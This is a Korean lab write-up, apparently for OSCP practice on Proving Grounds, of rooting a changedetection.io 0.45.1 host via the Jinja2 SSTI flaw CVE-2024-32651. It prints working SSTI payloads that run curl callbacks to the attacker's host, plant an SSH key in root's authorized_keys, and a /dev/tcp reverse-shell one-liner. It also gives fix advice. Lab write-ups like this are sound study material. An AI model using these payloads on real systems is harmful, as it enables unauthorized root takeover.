---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssti
  - tech/payload/revshell
  - tech/cred/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.97
ports: [22, 5000]
services: [http, ssh]
cves: [CVE-2024-32651]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 192.168.248.97 · Ubuntu 20.04 · Fundamental · 플래그 1개(root only)
> 진입점: 5000/tcp changedetection.io v0.45.1(무인증) → CVE-2024-32651 Jinja2 SSTI → RCE
> 권한상승: 불필요 — 앱이 root 로 구동돼 SSTI 명령이 곧 root 명령
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.97

### Initial Access – 무인증 노출된 changedetection.io v0.45.1 알림 템플릿 Jinja2 SSTI 로 root 원격 코드 실행 (CVE-2024-32651)

**Vulnerability Explanation:** 워치 변화 시 알림(apprise)을 발송하는데, 그 알림 제목·본문·URL 이 Jinja2 템플릿으로 렌더됨.

- 렌더가 **샌드박스 없는** 일반 `jinja2.Environment` 로 돌아 임의 표현식이 평가됨 = SSTI
- `/settings` 화면이 「You can use Jinja2 templating in the notification title, body and URL」 문구와 토큰 표(`{{base_url}}`·`{{watch_url}}`·`{{diff}}` …)를 그대로 노출 — 취약점이 UI 에 광고돼 있음(아래 재현 절 스크린샷)
- 0.45.20 이하 해당 · CVSS 3.1 = 10.0

**Vulnerability Fix:**

- **0.45.21 이상으로 업그레이드**
- 알림 템플릿은 `SandboxedEnvironment` 로만 렌더 — 아래 재현 절 확인대로 표준 탈출 체인이 첫 홉(`__init__` 접근)에서 `SecurityError` 로 막힘
- 앱을 **비-root 전용 계정**으로 구동 — root 구동이 임의 RCE 를 즉시 완전 장악으로 만듦
- `/backup`·`/settings` 에 인증 강제 — 무인증 설정 노출 자체가 시크릿 유출
- 5000 을 리버스 프록시 없이 직접 노출하지 말 것

**Severity:** Critical — 무인증 원격 RCE, 프로세스가 root 로 구동돼 즉시 root

**Steps to reproduce the attack:**

1. `/settings` 알림 본문 필드에 Jinja2 SSTI 페이로드 저장
2. 저장(`POST /settings`) 시점에 렌더되며 명령 실행
3. root 권한 실행이므로 SSH 공개키를 `/root/.ssh/authorized_keys` 에 심어 대화형 root 셸 확보

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.97 | TCP: 22, 5000 |

`recon.sh` 실행분 — `nnmap` 별칭 대신 recon.sh 가 돌린 형태.

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Python http.server 3.5 - 3.10
|_http-title: Change Detection
```
— 출처: `~/PG/Detection/nmap-quick.txt`

`-p-` 전체 스캔 → 추가 TCP 포트 없음(`nmap-full.txt`). 22·5000 이 전부.
UDP top-100 은 10개 `closed` · 90개 `open|filtered`(무응답, `--max-retries 1`) — UDP 는 배제가 아니라 미확정(`nmap-udp-top100.txt`).

`Python http.server 3.5 - 3.10` 은 nmap 의 추정(배너 아님) — 응답에 `Server` 헤더 자체가 없음(`web-5000/root.headers`). 실제는 changedetection.io(Flask 앱). 자동 판정을 서비스 근거로 쓰지 않고 아래 독립 근거 2개로 확정([[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]]).

**버전 판정 — 독립 근거 2개**
1. 응답 본문 문자열 `v0.45.1`(`web-5000/root.body`)
2. UI 우상단 버전 배지 `v0.45.1`(스크린샷)

![[PG-Detection-changedetection-index-5000.png]]

→ changedetection.io 0.45.1. `/` 가 200 으로 워치 목록을 그대로 노출 = 인증 게이트 없음.

**디렉터리 열거** — gobuster:

```text
/login                (Status: 200) [Size: 11444]
/logout               (Status: 302) [Size: 189] [--> /]
/backup               (Status: 200) [Size: 40480]
/import               (Status: 200) [Size: 15099]
/settings             (Status: 200) [Size: 41520]
```
— 출처: `~/PG/Detection/gobuster-5000.txt`

`/settings` 가 SSTI sink. `/backup`·`/import`·`/settings` 는 상단 네비게이션에도 노출돼 열거 없이도 도달 가능(스크린샷).

`/backup` — 무인증으로 전체 설정 zip 배포(실제 회수는 root 획득 후).

- 회수본 40,696 B — gobuster 측정치 40,480 B 와 다름. 요청마다 zip 을 새로 생성해 크기가 달라지는 것으로 추정 [가정]
- zip 안 `url-watches.json` 의 `password: false` = 앱 비밀번호 미설정 → `/login` 은 존재하나 우회할 게이트가 애초에 없음
- 같은 zip 에 `secret.txt`·API 토큰 존재. 추가 플래그는 없음

— 출처: `~/PG/Detection/backup_extract/`

### Initial Access – SSTI → root RCE

![[PG-Detection-notification-ssti-payload.png]]

sink 실물 — `/settings` 의 Notification Body 필드에 SSH 키 심기 페이로드가 그대로 담긴 화면. 하단에 Jinja2 토큰 표와 `Send test notification` 버튼이 함께 보임.
— 출처: `~/PG/Detection/shot_5000_settings_notifications.png`

---

**RCE 확인 (비블로킹 콜백)**
`~/PG/Detection/ssti/save_settings.py` — 세션 쿠키·CSRF 회수 → 전체 설정 필드 POST → 저장. 알림 본문에 SSTI 페이로드를 넣고 Kali HTTP 리스너로 명령 결과를 콜백 회수.

```text
{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl -s http://192.168.45.207/hit-p1-$(id | base64 -w0)").read() }}
```
— 출처: `~/PG/Detection/ssti/p1.j2`

조각별 역할:

| 조각 | 역할 |
|---|---|
| `self` | Jinja2 가 템플릿 컨텍스트에 넣는 `TemplateReference` 객체 |
| `.__init__.__globals__` | 그 초기화 함수의 전역 네임스페이스(`jinja2.runtime` 모듈, `__builtins__` 포함) |
| `.__builtins__.__import__('os')` | 내장 `__import__` 로 `os` 로드 |
| `.popen('<cmd>').read()` | 명령 실행 후 stdout 회수 |

Kali jinja2 3.1.6 에서 직접 실행해 확인 — `SandboxedEnvironment` 로 렌더하면 첫 홉에서 막힘:
```text
jinja2.exceptions.SecurityError: access to attribute '__init__' of 'TemplateReference' object is unsafe.
```
→ 이 체인은 「샌드박스를 뚫는」 것이 아니라 「샌드박스가 없어서」 통하는 것.

콜백 base64 = `uid=0(root) gid=0(root) groups=0(root)`. 앱이 root 로 구동 — `harvest_root.txt` PROCS 에 `root 844 ... /usr/bin/python3 /usr/local/bin/changedetection.io -d /opt/detection -p 5000`.

**트리거 지점** — 실측은 `POST /settings` 저장 자체가 렌더 시점. `id` 콜백이 `POST /settings` 저장 직후 도착(`listener/http80.log`):
```text
192.168.248.97 - - [21/Aug/2026 13:41:54] "GET /hit-p1-dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1" 404 -
# base64 -d → uid=0(root) gid=0(root) groups=0(root)
```
(13:42:24 의 두 번째 저장에서도 `/hit-title`·`/hit-body` 둘 다 콜백 = 제목·본문 양쪽이 렌더 sink). 저장 폼 검증 단계에서 렌더된다는 것은 관측된 타이밍에서의 추론 [가정] — 확실한 것은 「저장만으로 실행됐다」는 것.

**인용 규칙** — 바깥(Jinja2 문자열)과 안쪽(셸 명령)의 따옴표를 서로 다르게 쓸 것. 산출물 실제 형태도 그러함 — `p1.j2`·`p3_revshell.j2` 는 바깥 큰따옴표 + 안쪽 따옴표 없음, `p4_diag.j2`·`p6_sshkey.j2` 는 바깥 홑따옴표 + 안쪽 큰따옴표.

**대화형 root 셸 — SSH 키 심기**
비블로킹 명령으로 root `authorized_keys` 에 공개키를 심고, 앱과 독립된 sshd 채널로 pty 획득:
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('mkdir -p /root/.ssh; chmod 700 /root/.ssh; echo "<ed25519 pubkey>" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; curl -s http://192.168.45.207/keyplanted-$(wc -l < /root/.ssh/authorized_keys)').read() }}
```
명령이 전부 즉시 반환(mkdir/echo/chmod/curl)돼 popen 이 바로 끝나 요청 스레드가 막히지 않음([[_PLAYBOOK#A-32. 진입점을 내 페이로드로 죽였다]] — 1차 시도에서 블로킹 페이로드로 5000/tcp 를 무응답으로 만든 뒤 전환한 방식). 콜백 `GET /keyplanted-1` = 키 1줄 등록 성공.
```bash
ssh -i det_key root@192.168.248.97
```
타겟 pty — 플래그 위치 확인:

```bash
root@detection:~# find / -name proof.txt -o -name local.txt 2>/dev/null
/root/proof.txt
```
— 출처: `~/PG/Detection/proof_root.txt`

**자동 도구 미사용.** 전 과정 수동 curl/python + 공개 CVE PoC 기법(허용 — [[_PLAYBOOK#E. OSCP 시험 규정 — 금지 / 제한 / 허용]]).

**수동 대안(msfvenom 없이)** — SSH 키 심기 대신 리버스셸을 쓸 경우 `bash -c 'setsid nohup bash -i >& /dev/tcp/LHOST/443 0>&1 &'` 형태로 `&`+`setsid` 분리가 필수([[_PLAYBOOK#B-11. SSTI (Jinja2 / Flask)]]). 단 **이 형태는 이 박스에서 쓰지 않았고 검증되지 않음** [가정] — 실제로 통한 것은 위 SSH 키 심기.

**Local.txt value:**
없음 — 이 박스는 `/root/proof.txt` 단일 플래그(harvest.sh 전수 탐색·포털 슬롯 1개로 확인).

### Privilege Escalation – 없음 (초기 접근이 곧 root)

권한상승 절차 없음 — SSTI sink 가 root 프로세스이므로 최초 명령 실행부터 uid=0. 4항목(Explanation/Fix/Severity/Steps)은 생략함 — Initial Access 절이 이미 root 획득까지 포함.

근거 — 셸 직후 열거의 PROCS 섹션에 `changedetection pid 844 ... root` 로 프로세스 소유자가 root. SUDO 섹션:

```text
User root may run the following commands on detection:
    (ALL : ALL) ALL
```
— 출처: `~/PG/Detection/harvest_root.txt` (1336행 전량 보존)

SUID 섹션은 **39개** — `/usr/bin/{fusermount,sudo,su,umount,passwd,chsh,chfn,at,mount,newgrp,gpasswd}` + `/usr/lib/{dbus-1.0/dbus-daemon-launch-helper,openssh/ssh-keysign,eject/dmcrypt-get-device,snapd/snap-confine}` + `/snap/core20/{2015,2318}/…`·`/snap/snapd/{21759,20290}/…` 중복분 — 전부 Ubuntu 20.04 표준이라 권한상승 경로로서의 의미 없음(이미 root 라 필요도 없음).

### Post-Exploitation

**Proof.txt value:**
대화형 root SSH pty 한 화면 — 실측 원문:

```bash
root@detection:~# whoami; id; hostname; hostname -I; date; cat /root/proof.txt |
 tee /root/.pt
root
uid=0(root) gid=0(root) groups=0(root)
detection
192.168.248.97
Fri 21 Aug 2026 05:08:05 AM UTC
05a2b432fb4eb4091fb7ed500bb7a9bd
root@detection:~#
```
— 출처: `~/PG/Detection/proof_root.txt`

파일 속성:

```text
-rwx------ 1 root root 33 Aug 21 05:05 /root/proof.txt
```
— 출처: `~/PG/Detection/harvest_root.txt` FLAGS 섹션

**값:** `05a2b432fb4eb4091fb7ed500bb7a9bd`

웹셸·SSTI 가 아니라 sshd 채널의 대화형 pty 에서 원위치 `cat` = 시험 유효. 위 `root@detection:~#` 프롬프트가 그 판정 근거임. 시각은 UTC 05:08 = KST 14:08 로 산출물 mtime 과 일치.

**남긴 흔적**
- 타겟: `/root/.ssh/authorized_keys`(심은 키) 제거·파일 삭제 확인, `/tmp/.h.sh`·`/tmp/.h/`·`/root/.pt` 삭제, `/settings` 알림 본문 원복. `/root/.ssh` 빈 디렉터리는 남김([가정] 사전 존재 불명).
- Kali: 리스너(80/443/4444)·tmux(det-*) 전부 종료 확인(`ss`·`tmux ls`). 광범위 pkill 미사용, tmux 는 세션 이름으로만 종료.
- Kali 에 이 작업 소유가 아닌 잔존 프로세스 1건(pid 347623 `sudo nc -lvnp 80`, 작업 시작 이전부터 존재, LISTEN 아님) — 다른 작업 소유일 수 있어 손대지 않음(`cleanup.txt`).
- 산출물: `~/PG/Detection/`(nmap·gobuster·ssti/·backup·harvest·proof·cleanup·writeup_notes).

## 관련

- CVE-2024-32651 — changedetection.io ≤ 0.45.20 Jinja2 SSTI RCE, 0.45.21 패치. CVSS 3.1 = 10.0(NVD)
- GitHub Advisory `GHSA-4r7v-whpg-8rx3` — dgtlmoon/changedetection.io
- [[_PLAYBOOK#B-11. SSTI (Jinja2 / Flask)]] — 탐지 신호·탈출 체인·함정
- [[_PLAYBOOK#A-32. 진입점을 내 페이로드로 죽였다]] — 블로킹 popen 데드락 실측
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] — 리스너 점유·tmux capture-pane 함정
- [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] — nmap 서비스 오판
